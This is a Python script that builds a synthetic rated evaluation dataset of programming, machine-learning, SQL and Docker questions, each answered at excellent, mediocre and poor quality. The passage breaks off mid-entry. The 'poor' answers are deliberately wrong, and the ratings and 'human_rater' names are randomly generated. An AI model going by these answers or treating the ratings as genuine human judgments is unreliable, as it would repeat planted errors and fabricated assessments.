"""Generate a 1000-row evals_dataset.csv with realistic prompt/response pairs."""
import csv
import random
import os

random.seed(42)
RATERS = ["alice", "bob", "carol", "david", "eve"]

rows = []


def add(prompt, criteria, excellent, mediocre, poor):
    for responses, rating_range in [
        (excellent, (8, 10)),
        (mediocre, (4, 7)),
        (poor, (1, 3)),
    ]:
        for resp in responses:
            rows.append({
                "prompt": prompt,
                "response": resp.strip(),
                "quality_rating": random.randint(*rating_range),
                "criteria": criteria,
                "human_rater": random.choice(RATERS),
            })


# ── Python ────────────────────────────────────────────────────────────────────
add(
    "Write a Python function to reverse a string",
    "Is the response correct and Pythonic?",
    excellent=[
        "def reverse_string(s):\n    return s[::-1]",
        'def reverse_string(s):\n    return "".join(reversed(s))',
        'def reverse_string(s):\n    result = ""\n    for ch in s:\n        result = ch + result\n    return result',
        "def reverse_string(s):\n    return s[::-1]  # O(n) time, O(n) space",
    ],
    mediocre=[
        "You can reverse a string using slicing: s[::-1]. This works for most cases.",
        "def reverse(s):\n    return s[::-1]  # works for ASCII strings",
        "Use the reversed() built-in: ''.join(reversed(s))",
    ],
    poor=[
        "Strings in Python are immutable so you cannot reverse them in place.",
        "Use the reverse() method: s.reverse()",
        "def reverse_string(s):\n    s.sort()  # sort the string",
    ],
)

add(
    "Explain Python list comprehensions with an example",
    "Is the explanation accurate and does the example work?",
    excellent=[
        "A list comprehension creates a new list by applying an expression to each element.\nsquares = [x**2 for x in range(10)]\n# [0, 1, 4, 9, 16, 25, 36, 49, 64, 81]\nWith filter:\nevens = [x for x in range(20) if x % 2 == 0]",
        "List comprehensions are concise list builders:\nnumbers = [1,2,3,4,5]\ndoubled = [n * 2 for n in numbers]  # [2, 4, 6, 8, 10]\nWith condition:\nodds = [n for n in numbers if n % 2 != 0]  # [1, 3, 5]",
        "Syntax: [expression for item in iterable if condition]\nExample:\nmatrix = [[1,2,3],[4,5,6]]\nflat = [x for row in matrix for x in row]  # [1,2,3,4,5,6]",
        "List comprehension vs loop:\n# Loop\nresult = []\nfor x in range(5):\n    result.append(x**2)\n# Equivalent comprehension\nresult = [x**2 for x in range(5)]  # faster and more readable",
    ],
    mediocre=[
        "List comprehensions let you create lists in one line. Example: [x for x in range(5)]",
        "They are a shorthand for loops. squares = [x*x for x in range(10)]",
        "Comprehensions are faster than loops and more Pythonic.",
    ],
    poor=[
        "List comprehensions are like dictionaries but for lists.",
        "You use them with the map() function to transform lists.",
        "def list_comprehension(lst): return [lst]",
    ],
)

add(
    "How do you handle exceptions in Python?",
    "Does the response explain try/except correctly with good examples?",
    excellent=[
        "Use try/except/finally:\ntry:\n    result = 10 / 0\nexcept ZeroDivisionError as e:\n    print(f'Error: {e}')\nfinally:\n    print('always runs')\n\nMultiple exceptions:\nexcept (TypeError, ValueError) as e:\n    ...",
        "try:\n    x = int(input('number: '))\nexcept ValueError:\n    print('Not a number')\nelse:\n    print(f'Got {x}')  # runs only if no exception\nfinally:\n    print('Done')  # always runs",
        "Raise your own exceptions:\nclass InsufficientFunds(Exception):\n    pass\n\ndef withdraw(amount):\n    if amount > balance:\n        raise InsufficientFunds(f'Need {amount}, have {balance}')",
        "Catch specific exceptions first, broad ones last:\ntry:\n    data = json.loads(text)\nexcept json.JSONDecodeError:\n    return None\nexcept Exception as e:\n    logger.error(e)\n    raise",
    ],
    mediocre=[
        "Use try and except. Put risky code in try block and handle errors in except block.",
        "try:\n    risky_code()\nexcept Exception as e:\n    print(e)",
        "You can catch different exceptions with multiple except clauses.",
    ],
    poor=[
        "Python uses the error keyword to catch exceptions.",
        "You should avoid exceptions by checking conditions with if statements beforehand.",
        "Exceptions should be ignored: except: pass",
    ],
)

add(
    "Write a Python function to check if a string is a palindrome",
    "Is the implementation correct and efficient?",
    excellent=[
        "def is_palindrome(s):\n    s = s.lower().replace(' ', '')\n    return s == s[::-1]\n\n# is_palindrome('racecar') -> True\n# is_palindrome('A man a plan a canal Panama') -> True",
        "def is_palindrome(s: str) -> bool:\n    cleaned = ''.join(c.lower() for c in s if c.isalnum())\n    return cleaned == cleaned[::-1]",
        "def is_palindrome(s):\n    left, right = 0, len(s) - 1\n    while left < right:\n        if s[left] != s[right]:\n            return False\n        left += 1\n        right -= 1\n    return True",
        "def is_palindrome(s):\n    s = s.lower()\n    return all(s[i] == s[~i] for i in range(len(s) // 2))",
    ],
    mediocre=[
        "def is_palindrome(s):\n    return s == s[::-1]",
        "Compare string to its reverse. If equal it's a palindrome.",
        "def palindrome(s):\n    return s == ''.join(reversed(s))",
    ],
    poor=[
        "def is_palindrome(s):\n    return len(s) % 2 == 0",
        "A palindrome reads the same forwards and backwards. Use a loop to check.",
        "def is_palindrome(s):\n    return s.count(s[0]) == len(s)",
    ],
)

add(
    "Explain Python generators and when to use them",
    "Is the generator concept correct with a practical use case?",
    excellent=[
        "Generators produce values lazily using yield instead of returning all at once.\n\ndef count_up(n):\n    i = 0\n    while i < n:\n        yield i\n        i += 1\n\nfor x in count_up(1000000):  # never stores 1M items in memory\n    print(x)\n\nUse when: processing large files, infinite sequences, pipelines.",
        "Generators use yield to produce one value at a time:\n\n# Generator function\ndef fibonacci():\n    a, b = 0, 1\n    while True:\n        yield a\n        a, b = b, a + b\n\n# Generator expression (like list comprehension but lazy)\nsquares = (x**2 for x in range(1000000))  # no memory allocated yet\nnext(squares)  # 0",
        "Key benefit: memory efficiency.\n\n# List — stores all 1M items in RAM\ndata = [process(line) for line in open('huge.csv')]\n\n# Generator — processes one line at a time\ndef read_csv(path):\n    with open(path) as f:\n        for line in f:\n            yield process(line)\n\nfor row in read_csv('huge.csv'):  # O(1) memory\n    ...",
        "Generators implement the iterator protocol automatically.\nA function with yield becomes a generator factory.\n\ndef take(n, gen):\n    for _ in range(n):\n        yield next(gen)\n\nfib = fibonacci()\nprint(list(take(10, fib)))  # [0,1,1,2,3,5,8,13,21,34]",
    ],
    mediocre=[
        "Generators use yield instead of return. They are memory efficient for large datasets.",
        "def gen():\n    for i in range(10):\n        yield i  # produces values one at a time",
        "Use generators when you don't want to load all data into memory at once.",
    ],
    poor=[
        "Generators are functions that generate random numbers.",
        "def generator():\n    return [x for x in range(10)]",
        "Generators are slower than lists so only use them for very large data.",
    ],
)

add(
    "What are Python decorators and how do you write one?",
    "Is the decorator concept explained correctly with a working example?",
    excellent=[
        "A decorator wraps a function to add behavior without modifying it.\n\nimport functools\n\ndef log_calls(func):\n    @functools.wraps(func)  # preserves func.__name__ etc.\n    def wrapper(*args, **kwargs):\n        print(f'Calling {func.__name__}')\n        result = func(*args, **kwargs)\n        print(f'{func.__name__} returned {result}')\n        return result\n    return wrapper\n\n@log_calls\ndef add(a, b):\n    return a + b\n\nadd(2, 3)  # prints log, returns 5",
        "Decorators are syntactic sugar for higher-order functions:\n@decorator\ndef func(): ...\n# is equivalent to:\nfunc = decorator(func)\n\nPractical example — timing decorator:\nimport time, functools\n\ndef timer(func):\n    @functools.wraps(func)\n    def wrapper(*args, **kwargs):\n        start = time.perf_counter()\n        result = func(*args, **kwargs)\n        print(f'{func.__name__}: {time.perf_counter()-start:.3f}s')\n        return result\n    return wrapper",
        "Decorator with arguments (factory pattern):\ndef retry(max_attempts=3):\n    def decorator(func):\n        @functools.wraps(func)\n        def wrapper(*args, **kwargs):\n            for attempt in range(max_attempts):\n                try:\n                    return func(*args, **kwargs)\n                except Exception as e:\n                    if attempt == max_attempts - 1:\n                        raise\n        return wrapper\n    return decorator\n\n@retry(max_attempts=5)\ndef fetch_data(): ...",
        "Decorators can be classes too:\nclass cache:\n    def __init__(self, func):\n        self.func = func\n        self.memo = {}\n        functools.update_wrapper(self, func)\n    def __call__(self, *args):\n        if args not in self.memo:\n            self.memo[args] = self.func(*args)\n        return self.memo[args]",
    ],
    mediocre=[
        "Decorators add functionality to functions using @syntax. They wrap the function.",
        "def my_decorator(func):\n    def wrapper(*args):\n        print('before')\n        func(*args)\n        print('after')\n    return wrapper",
        "Use functools.wraps to preserve the original function's metadata.",
    ],
    poor=[
        "Decorators are classes that extend other classes in Python.",
        "def decorator(func):\n    print('called')\n    return func",
        "Python has built-in decorators like @class and @function.",
    ],
)

# ── JavaScript ────────────────────────────────────────────────────────────────
add(
    "Write an async JavaScript function to fetch data from an API",
    "Is the async/await usage correct and does it handle errors?",
    excellent=[
        "async function fetchData(url) {\n  try {\n    const response = await fetch(url);\n    if (!response.ok) {\n      throw new Error(`HTTP error! status: ${response.status}`);\n    }\n    return await response.json();\n  } catch (error) {\n    console.error('Fetch failed:', error);\n    throw error;\n  }\n}",
        "async function getData(url, options = {}) {\n  const response = await fetch(url, {\n    headers: { 'Content-Type': 'application/json' },\n    ...options\n  });\n  if (!response.ok) throw new Error(`${response.status} ${response.statusText}`);\n  return response.json();\n}",
        "async function fetchWithRetry(url, retries = 3) {\n  for (let i = 0; i < retries; i++) {\n    try {\n      const res = await fetch(url);\n      if (!res.ok) throw new Error(res.status);\n      return await res.json();\n    } catch (e) {\n      if (i === retries - 1) throw e;\n      await new Promise(r => setTimeout(r, 1000 * (i + 1)));\n    }\n  }\n}",
        "const fetchData = async (url) => {\n  const controller = new AbortController();\n  const timeout = setTimeout(() => controller.abort(), 5000);\n  try {\n    const res = await fetch(url, { signal: controller.signal });\n    return await res.json();\n  } finally {\n    clearTimeout(timeout);\n  }\n};",
    ],
    mediocre=[
        "async function fetchData(url) {\n  const res = await fetch(url);\n  return res.json();\n}",
        "You can use fetch() with async/await:\nconst data = await fetch(url).then(r => r.json());",
        "async function get(url) {\n  const response = await fetch(url);\n  const data = await response.json();\n  return data;\n}",
    ],
    poor=[
        "Use XMLHttpRequest to fetch data from an API in JavaScript.",
        "fetch(url) returns a promise. Use .then() to get the data.",
        "function fetchData(url) {\n  return fetch(url);\n}",
    ],
)

add(
    "Explain JavaScript closures with an example",
    "Is the closure concept explained correctly with a working example?",
    excellent=[
        "A closure is a function that retains access to its outer scope even after the outer function returns.\n\nfunction makeCounter() {\n  let count = 0;\n  return function() {\n    count++;\n    return count;\n  };\n}\n\nconst counter = makeCounter();\ncounter(); // 1\ncounter(); // 2  — count persists in closure",
        "Closures enable data privacy:\n\nfunction createBankAccount(initialBalance) {\n  let balance = initialBalance;  // private\n  return {\n    deposit(amount) { balance += amount; },\n    withdraw(amount) { balance -= amount; },\n    getBalance() { return balance; }\n  };\n}\n\nconst acc = createBankAccount(100);\nacc.deposit(50);\nacc.getBalance(); // 150\nacc.balance;      // undefined — private!",
        "Closures in loops — common gotcha:\n// Bug: all closures share the same 'i'\nfor (var i = 0; i < 3; i++) {\n  setTimeout(() => console.log(i), 0); // prints 3,3,3\n}\n\n// Fix with let (block scope):\nfor (let i = 0; i < 3; i++) {\n  setTimeout(() => console.log(i), 0); // prints 0,1,2\n}",
        "Closure for memoization:\nfunction memoize(fn) {\n  const cache = {};  // captured by closure\n  return function(...args) {\n    const key = JSON.stringify(args);\n    if (key in cache) return cache[key];\n    cache[key] = fn.apply(this, args);\n    return cache[key];\n  };\n}",
    ],
    mediocre=[
        "A closure is when a function can access variables outside its own scope.\nfunction outer() { let x = 1; return () => x; }",
        "Closures are functions inside functions. The inner function can use the outer function's variables.",
        "function greet(name) {\n  return function() { console.log('Hello, ' + name); };\n}",
    ],
    poor=[
        "Closures are a way to close over variables so they cannot be accessed from outside.",
        "Closures are the same as callbacks in JavaScript.",
        "A closure is a function that is closed and cannot be called.",
    ],
)

add(
    "What is the difference between let, const, and var in JavaScript?",
    "Is the scoping and mutability distinction correct?",
    excellent=[
        "var: function-scoped, hoisted (initialized as undefined), can redeclare.\nlet: block-scoped, hoisted but not initialized (TDZ), cannot redeclare.\nconst: block-scoped, must be initialized, cannot reassign (but object properties can change).\n\nExample:\nif (true) {\n  var x = 1;   // accessible outside block\n  let y = 2;   // block-scoped\n  const z = 3; // block-scoped\n}\nconsole.log(x); // 1\nconsole.log(y); // ReferenceError",
        "const obj = { a: 1 };\nobj.a = 2;    // OK — property change\nobj = {};     // TypeError — reassignment\n\nRule: prefer const by default, use let when you need reassignment, avoid var entirely in modern JS.\n\nTemporal Dead Zone: let/const are hoisted but accessing before declaration throws ReferenceError.",
        "Hoisting differences:\nvar: hoisted and initialized to undefined\nlet/const: hoisted but in TDZ (not initialized)\n\nconsole.log(a); // undefined (var hoisted)\nconsole.log(b); // ReferenceError (TDZ)\nvar a = 1;\nlet b = 2;",
        "Loop behavior:\nfor (var i = 0; i < 3; i++) {\n  setTimeout(() => console.log(i)); // 3,3,3 (shared var)\n}\nfor (let i = 0; i < 3; i++) {\n  setTimeout(() => console.log(i)); // 0,1,2 (block-scoped)\n}",
    ],
    mediocre=[
        "var is function scoped, let and const are block scoped. const cannot be reassigned.",
        "Use const for values that don't change, let for values that do, and avoid var.",
        "const is for constants, let is for variables that change.",
    ],
    poor=[
        "They are all the same but const is for constants.",
        "var is the old way, let is the new way. const is for arrays.",
        "let is faster than var because it uses less memory.",
    ],
)

add(
    "How does prototypal inheritance work in JavaScript?",
    "Is the prototype chain explained correctly?",
    excellent=[
        "Every JS object has an internal [[Prototype]] link to another object.\n\nfunction Animal(name) { this.name = name; }\nAnimal.prototype.speak = function() {\n  return `${this.name} makes a sound`;\n};\n\nfunction Dog(name) { Animal.call(this, name); }\nDog.prototype = Object.create(Animal.prototype);\nDog.prototype.constructor = Dog;\nDog.prototype.bark = function() { return 'Woof!'; };\n\nconst d = new Dog('Rex');\nd.bark();   // Woof! (own prototype)\nd.speak();  // Rex makes a sound (inherited)",
        "ES6 class syntax (syntactic sugar over prototypes):\nclass Animal {\n  constructor(name) { this.name = name; }\n  speak() { return `${this.name} speaks`; }\n}\nclass Dog extends Animal {\n  bark() { return 'Woof!'; }\n}\nconst d = new Dog('Rex');\nd.bark();    // Woof!\nd.speak();   // Rex speaks — found via prototype chain\nd.__proto__ === Dog.prototype  // true",
        "Prototype chain lookup:\nwhen you access obj.method, JS looks:\n1. obj itself\n2. obj.__proto__ (Dog.prototype)\n3. obj.__proto__.__proto__ (Animal.prototype)\n4. Object.prototype\n5. null — property not found → undefined\n\nObject.create(proto) creates object with proto as prototype.",
        "Mixin pattern (avoid deep inheritance):\nconst Serializable = {\n  serialize() { return JSON.stringify(this); },\n  deserialize(s) { return Object.assign(this, JSON.parse(s)); }\n};\nObject.assign(MyClass.prototype, Serializable);",
    ],
    mediocre=[
        "JavaScript uses prototype chains. Each object has a prototype and inherits properties from it.",
        "class Dog extends Animal {} — this sets up prototypal inheritance in modern JS.",
        "Objects inherit from other objects via the prototype chain.",
    ],
    poor=[
        "JavaScript doesn't have real inheritance, only prototypes which are like copies.",
        "Prototypal inheritance is slower than classical inheritance.",
        "Use Object.copy() to inherit from another object.",
    ],
)

add(
    "Write a JavaScript function to debounce another function",
    "Is the debounce implementation correct?",
    excellent=[
        "function debounce(fn, delay) {\n  let timer;\n  return function(...args) {\n    clearTimeout(timer);\n    timer = setTimeout(() => fn.apply(this, args), delay);\n  };\n}\n\n// Usage: only fires 300ms after user stops typing\nconst handleInput = debounce((e) => search(e.target.value), 300);\ninput.addEventListener('input', handleInput);",
        "function debounce(fn, ms, immediate = false) {\n  let timeout;\n  return function(...args) {\n    const later = () => {\n      timeout = null;\n      if (!immediate) fn.apply(this, args);\n    };\n    const callNow = immediate && !timeout;\n    clearTimeout(timeout);\n    timeout = setTimeout(later, ms);\n    if (callNow) fn.apply(this, args);\n  };\n}",
        "// With cancel and flush\nfunction debounce(fn, delay) {\n  let timer;\n  function debounced(...args) {\n    clearTimeout(timer);\n    timer = setTimeout(() => fn.apply(this, args), delay);\n  }\n  debounced.cancel = () => clearTimeout(timer);\n  debounced.flush = () => { clearTimeout(timer); fn(); };\n  return debounced;\n}",
        "// Compare debounce vs throttle:\n// Debounce: fires only AFTER activity stops for `delay` ms\n// Throttle: fires at most once per `delay` ms interval\n\nfunction debounce(fn, delay) {\n  let id;\n  return (...args) => {\n    clearTimeout(id);\n    id = setTimeout(() => fn(...args), delay);\n  };\n}",
    ],
    mediocre=[
        "function debounce(fn, delay) {\n  let timer;\n  return function() {\n    clearTimeout(timer);\n    timer = setTimeout(fn, delay);\n  };\n}",
        "Debounce delays a function call until after a period of inactivity.",
        "function debounce(func, wait) {\n  let timeout;\n  return function() {\n    clearTimeout(timeout);\n    timeout = setTimeout(func, wait);\n  }\n}",
    ],
    poor=[
        "function debounce(fn) {\n  setTimeout(fn, 1000);\n}",
        "Use setInterval to debounce function calls.",
        "Debounce means to call a function multiple times quickly.",
    ],
)

# ── Machine Learning ──────────────────────────────────────────────────────────
add(
    "What is the difference between supervised and unsupervised learning?",
    "Is the distinction clear with good examples of each?",
    excellent=[
        "Supervised: trains on labeled data (X, y pairs). Model learns f(X) → y.\nExamples: spam classification, house price prediction, image recognition.\nAlgorithms: linear regression, SVM, neural networks.\n\nUnsupervised: no labels — find hidden structure in X.\nExamples: customer segmentation, anomaly detection, topic modeling.\nAlgorithms: k-means, PCA, DBSCAN, autoencoders.",
        "Supervised: you know the correct output during training.\n- Classification: predict class label (spam/not spam)\n- Regression: predict continuous value (stock price)\n\nUnsupervised: discover patterns without labels.\n- Clustering: group similar data points\n- Dimensionality reduction: compress features\n- Generative models: learn data distribution",
        "Semi-supervised: small labeled + large unlabeled data.\nSelf-supervised: generate labels from data itself (BERT masked language modeling, SimCLR).\nReinforcement learning: learn by interacting with environment and receiving rewards.",
        "Practical decision:\n- Have labeled data + want to predict? → Supervised\n- No labels, want to explore structure? → Unsupervised\n- Labels expensive but have lots of raw data? → Semi-supervised\n- Sequential decision making? → Reinforcement learning",
    ],
    mediocre=[
        "Supervised learning uses labeled data, unsupervised learning does not. Supervised can predict outcomes.",
        "In supervised learning you know the answers during training. In unsupervised you let the algorithm find patterns.",
        "Supervised = classification/regression. Unsupervised = clustering.",
    ],
    poor=[
        "Supervised learning is faster because the computer supervises itself.",
        "Unsupervised learning is more accurate because it does not need human input.",
        "The difference is just the amount of training data required.",
    ],
)

add(
    "Explain what precision and recall are and when to optimize for each",
    "Is the precision/recall tradeoff explained correctly?",
    excellent=[
        "Precision = TP / (TP + FP): of all predicted positives, how many are truly positive?\nRecall = TP / (TP + FN): of all actual positives, how many did we catch?\n\nOptimize precision when: false positives are costly.\n- Spam filter: better miss spam than block valid email\n- Legal document review: don't flag innocent docs as evidence\n\nOptimize recall when: false negatives are costly.\n- Cancer screening: better over-screen than miss a case\n- Fraud detection: better flag innocent transactions than miss fraud\n\nF1 = harmonic mean of precision and recall (balanced metric).",
        "Confusion matrix:\n               Predicted+   Predicted-\nActual+  |    TP (hit)  |  FN (miss)  |\nActual-  |    FP (FA)   |  TN (correct) |\n\nPrecision = TP/(TP+FP)  — quality of positives\nRecall    = TP/(TP+FN)  — coverage of actual positives\n\nTradeoff: raising classification threshold → higher precision, lower recall.\nLowering threshold → lower precision, higher recall.\n\nUse PR-AUC instead of ROC-AUC for imbalanced datasets.",
        "Example — disease screening test:\n1000 patients, 10 actually sick\nModel predicts 50 sick: 9 correct, 41 false alarms\n\nPrecision = 9/50 = 0.18 (many false alarms)\nRecall    = 9/10 = 0.90 (caught 90% of sick patients)\n\nFor cancer screening: high recall is critical (prefer false alarms over missed cases).",
        "F-beta score generalizes F1:\nF_beta = (1+beta^2) * precision*recall / (beta^2*precision + recall)\n\nbeta=0.5: weights precision higher\nbeta=2.0: weights recall higher (more important not to miss positives)",
    ],
    mediocre=[
        "Precision is about how accurate the positive predictions are. Recall is about catching all positives. There is usually a tradeoff between them.",
        "High precision = few false positives. High recall = few false negatives. Use F1 score to balance both.",
        "Precision tells you how precise your model is. Recall tells you how much it remembers.",
    ],
    poor=[
        "Precision and recall are both accuracy metrics. Higher is always better.",
        "Recall is the same as accuracy. Precision is for classification only.",
        "Use whichever is higher as your primary metric.",
    ],
)

add(
    "What is a neural network and how does it learn?",
    "Is the neural network and backpropagation explanation accurate?",
    excellent=[
        "A neural network is a stack of layers, each transforming inputs through weights and non-linear activations:\n\nLayer output: a = activation(W @ x + b)\n\nLearning via backpropagation:\n1. Forward pass: compute predictions\n2. Compute loss (e.g., cross-entropy)\n3. Backward pass: compute gradients using chain rule\n4. Update weights: W -= lr * dL/dW\n\nRepeat until loss converges.",
        "Architecture:\nInput layer → Hidden layers → Output layer\nEach connection has a weight W.\nActivations introduce non-linearity: ReLU, sigmoid, tanh.\n\nTraining:\n- Loss measures prediction error: MSE, cross-entropy\n- Backprop computes gradient of loss w.r.t. each weight\n- Optimizer (SGD, Adam) updates weights to minimize loss\n- Epoch = one pass over all training data",
        "Universal approximation theorem: a neural network with one hidden layer and enough neurons can approximate any continuous function.\n\nPractically: deeper networks (many layers) learn hierarchical features.\nImage example:\nLayer 1: detects edges\nLayer 2: detects shapes\nLayer 3: detects objects",
        "Key hyperparameters:\n- Learning rate: step size for weight updates\n- Batch size: samples per gradient update\n- Epochs: full passes over training data\n- Architecture: number/size of layers\n- Activation: ReLU (default), sigmoid (output), softmax (multiclass)",
    ],
    mediocre=[
        "Neural networks have input, hidden, and output layers. They learn by adjusting weights using backpropagation.",
        "A neural network is inspired by the human brain. It learns patterns from training data.",
        "Neurons receive inputs, apply weights and activation functions, and pass output to the next layer.",
    ],
    poor=[
        "Neural networks are like brains but computers. They have thinking layers.",
        "Neural networks learn by memorizing all the training examples.",
        "They are good at everything and don't need hyperparameter tuning.",
    ],
)

add(
    "Explain the concept of regularization in machine learning",
    "Is regularization explained correctly with L1 and L2 differences?",
    excellent=[
        "Regularization adds a penalty to the loss function to prevent overfitting by discouraging large weights.\n\nL1 (Lasso): Loss + lambda * sum(|w|)\n- Produces sparse weights (many exactly zero)\n- Built-in feature selection\n- Good when you believe many features are irrelevant\n\nL2 (Ridge): Loss + lambda * sum(w^2)\n- Shrinks all weights proportionally\n- Spreads weight across correlated features\n- Generally more stable, default choice\n\nElastic Net: combines L1 and L2.",
        "Intuition:\nWithout regularization: model can use any weights → overfits training noise.\nWith L2: large weights are penalized → model prefers simpler explanations.\n\nlambda (regularization strength):\n- Too small: no effect, still overfits\n- Too large: underfits (weights → 0)\n- Tune via cross-validation\n\nIn deep learning: dropout and batch normalization often work better than L1/L2.",
        "Dropout (neural network regularization):\nDuring training, randomly zero out p fraction of neurons.\nEffect: network learns redundant representations, less reliance on specific neurons.\nAt inference: use all neurons, scale by (1-p).\n\nTypical rates: 0.2-0.5 for hidden layers.",
        "Weight decay in PyTorch:\noptimizer = torch.optim.Adam(model.parameters(), lr=1e-3, weight_decay=1e-4)\n# weight_decay implements L2 regularization\n\nIn sklearn:\nfrom sklearn.linear_model import Ridge, Lasso\nRidge(alpha=1.0)  # L2, alpha = lambda\nLasso(alpha=0.1)  # L1",
    ],
    mediocre=[
        "Regularization prevents overfitting by adding a penalty for large weights. L1 and L2 are the main types.",
        "L1 adds absolute values of weights to loss, L2 adds squared values. Both help prevent overfitting.",
        "Use regularization when your model is overfitting on the training data.",
    ],
    poor=[
        "Regularization makes the model more regular by normalizing the input data.",
        "L1 is better than L2 in all cases because it removes features.",
        "Regularization should be applied after training, not during.",
    ],
)

# ── SQL / Databases ───────────────────────────────────────────────────────────
add(
    "Write a SQL query to find the top 5 customers by total order value",
    "Is the SQL syntactically correct and logically sound?",
    excellent=[
        "SELECT c.customer_id, c.name, SUM(o.total_amount) AS total_value\nFROM customers c\nJOIN orders o ON c.customer_id = o.customer_id\nGROUP BY c.customer_id, c.name\nORDER BY total_value DESC\nLIMIT 5;",
        "SELECT\n    c.id,\n    c.email,\n    COUNT(o.id) AS order_count,\n    SUM(o.amount) AS total_spent\nFROM customers c\nINNER JOIN orders o ON o.customer_id = c.id\nGROUP BY c.id, c.email\nORDER BY total_spent DESC\nFETCH FIRST 5 ROWS ONLY;",
        "-- Including customers with no orders (showing NULL for no-order customers)\nSELECT c.name, COALESCE(SUM(o.amount), 0) AS total\nFROM customers c\nLEFT JOIN orders o ON o.customer_id = c.id\nGROUP BY c.id, c.name\nORDER BY total DESC\nLIMIT 5;",
        "-- Using window function for rank\nSELECT * FROM (\n    SELECT c.name,\n           SUM(o.amount) AS total,\n           RANK() OVER (ORDER BY SUM(o.amount) DESC) AS rnk\n    FROM customers c JOIN orders o ON c.id = o.customer_id\n    GROUP BY c.id, c.name\n) ranked WHERE rnk <= 5;",
    ],
    mediocre=[
        "SELECT customer_id, SUM(amount) FROM orders GROUP BY customer_id ORDER BY SUM(amount) DESC LIMIT 5;",
        "Join customers with orders, group by customer, sum the amounts, order descending, take top 5.",
        "SELECT customer_id, SUM(total) as total FROM orders GROUP BY customer_id ORDER BY total DESC LIMIT 5;",
    ],
    poor=[
        "SELECT TOP 5 * FROM customers ORDER BY total DESC;",
        "SELECT * FROM customers LIMIT 5;",
        "SELECT customer_id FROM orders WHERE amount > 100;",
    ],
)

add(
    "What are database transactions and why do they matter?",
    "Is ACID explained correctly with practical examples?",
    excellent=[
        "A transaction is a sequence of operations that executes as a single unit — either all succeed or all fail (atomicity).\n\nACID properties:\nA — Atomicity: all-or-nothing\nC — Consistency: moves DB from one valid state to another\nI — Isolation: concurrent transactions don't interfere\nD — Durability: committed data survives crashes\n\nExample — bank transfer:\nBEGIN;\nUPDATE accounts SET balance = balance - 100 WHERE id = 1;\nUPDATE accounts SET balance = balance + 100 WHERE id = 2;\nCOMMIT;  -- both succeed or neither (ROLLBACK on failure)",
        "Without transactions:\nif server crashes between debit and credit → money disappears!\n\nWith transactions:\nBEGIN TRANSACTION;\n  UPDATE accounts SET balance -= 500 WHERE user='alice';\n  UPDATE accounts SET balance += 500 WHERE user='bob';\nCOMMIT;\n\nIsolation levels (tradeoffs between consistency and concurrency):\n- READ UNCOMMITTED: see dirty reads\n- READ COMMITTED: no dirty reads (PostgreSQL default)\n- REPEATABLE READ: no phantom reads (MySQL default)\n- SERIALIZABLE: fully isolated (slowest)",
        "Savepoints allow partial rollback:\nBEGIN;\nINSERT INTO orders ...;\nSAVEPOINT after_order;\nINSERT INTO items ...;   -- fails\nROLLBACK TO SAVEPOINT after_order;\n-- order saved, items not\nCOMMIT;",
        "Deadlock: two transactions wait for each other's locks.\nPrevention: always acquire locks in the same order.\nDetection: DB kills one transaction (check for deadlock errors and retry).",
    ],
    mediocre=[
        "Transactions group multiple SQL statements so they all succeed or all fail together.",
        "BEGIN, COMMIT, ROLLBACK are the main transaction commands. Use them for operations that must be atomic.",
        "Transactions ensure data integrity. ACID stands for Atomicity, Consistency, Isolation, Durability.",
    ],
    poor=[
        "Transactions are used to speed up database queries.",
        "Use transactions only for SELECT queries.",
        "COMMIT saves the query, ROLLBACK deletes all data in the table.",
    ],
)

add(
    "Explain the difference between clustered and non-clustered indexes",
    "Is the index type distinction accurate?",
    excellent=[
        "Clustered index: determines the physical order of data rows.\n- One per table (data IS the index)\n- Primary key is clustered by default in most DBs\n- Range queries are very fast (data is contiguous)\n- INSERT/UPDATE can be slower (must maintain order)\n\nNon-clustered index: separate structure that points to data rows.\n- Many per table\n- Contains indexed columns + row pointer (RID or clustered key)\n- Good for selective queries on non-PK columns\n- Extra lookup to fetch actual row data (key lookup)",
        "Analogy:\nClustered = phone book (data sorted by last name — physical order)\nNon-clustered = book index (separate list of words → page numbers)\n\nSQL Server example:\n-- Clustered (one per table, often PK)\nCREATE CLUSTERED INDEX idx_pk ON orders(order_id);\n\n-- Non-clustered (many allowed)\nCREATE NONCLUSTERED INDEX idx_email ON users(email);\n\nIncluded columns to avoid key lookup:\nCREATE INDEX idx_email_inc ON users(email) INCLUDE (name, created_at);",
        "PostgreSQL note: all indexes in PG are non-clustered by default. CLUSTER command reorders table once but doesn't maintain order.\n\nMySQL InnoDB: primary key is always the clustered index. Secondary indexes contain PK value as row pointer.",
        "Covering index: non-clustered index that includes all columns needed by a query — eliminates the key lookup.\nGood for: frequently executed queries that access the same small set of columns.",
    ],
    mediocre=[
        "Clustered indexes sort the actual data. Non-clustered indexes create a separate structure that points to the data.",
        "You can have one clustered index per table but many non-clustered indexes.",
        "Clustered is faster for range queries, non-clustered is more flexible.",
    ],
    poor=[
        "Clustered indexes are for text columns, non-clustered are for numbers.",
        "Clustered indexes are always better and you should cluster all indexes.",
        "Non-clustered indexes take more storage so avoid them.",
    ],
)

# ── Docker ────────────────────────────────────────────────────────────────────
add(
    "Explain the difference between a Docker image and a container",
    "Is the image vs container distinction clearly and accurately explained?",
    excellent=[
        "Image: read-only template built from a Dockerfile. Stored as layered filesystem.\nContainer: running instance of an image — adds a writable layer, has its own network/process namespace.\n\nAnalogy: Image = class, Container = object (instance).\n\ndocker build → image\ndocker run   → container from image\ndocker start → restart stopped container",
        "Image layers:\nFROM python:3.11    # base layer\nRUN pip install ... # new layer\nCOPY . /app         # new layer\n\nLayers are cached and shared between images. Only changed layers are stored/transferred.\n\nContainer adds a thin writable layer on top. Stopped container retains writable layer.\ndocker commit → creates new image from container.",
        "Key commands:\ndocker image ls        # list images\ndocker ps              # running containers\ndocker ps -a           # all containers (including stopped)\ndocker run -d nginx    # run container in background\ndocker exec -it id sh  # shell into running container\ndocker rm id           # remove container\ndocker rmi image       # remove image",
        "Volumes vs container filesystem:\n- Container writable layer: ephemeral (lost when container removed)\n- Named volume: persisted, managed by Docker\n- Bind mount: maps host directory into container\n\ndocker run -v pg_data:/var/lib/postgresql/data postgres",
    ],
    mediocre=[
        "An image is the blueprint and a container is the running version of that blueprint.",
        "Docker images are built from Dockerfiles. Containers are started from images using docker run.",
        "Images are static, containers are running instances.",
    ],
    poor=[
        "They are basically the same thing. Containers are just running images.",
        "An image is a type of container that has not been started yet.",
        "Containers are heavier than images because they run processes.",
    ],
)

add(
    "What is Docker networking and how do containers communicate?",
    "Is Docker networking explained correctly with practical examples?",
    excellent=[
